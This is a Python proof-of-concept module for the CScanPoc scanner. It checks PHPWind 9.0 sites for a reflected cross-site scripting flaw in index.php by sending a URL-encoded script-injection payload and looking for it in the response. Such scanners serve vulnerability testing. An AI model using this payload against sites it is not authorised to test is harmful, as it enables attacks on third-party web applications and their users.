# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import md5
import urllib2

class Vuln(ABVuln):
    vuln_id = 'PHPWind_0005' # 平台漏洞编号，留空
    name = 'PHPWind 9.0 貝塔 反射XSS'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2012-09-14'  # 漏洞公布时间
    desc = '''
        漏洞文件：index.php.
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'PHPWind'  # 漏洞应用名称
    product_version = '9.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '73611450-df9f-48aa-b911-d3e38c8182a8'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/index.php?m=1%22%3E%3Cscript%3Ealert%28%22cscan%22%29%3C%2Fscript%3E%26c%3Dforum'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()

            if '<script>alert("cscan")</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
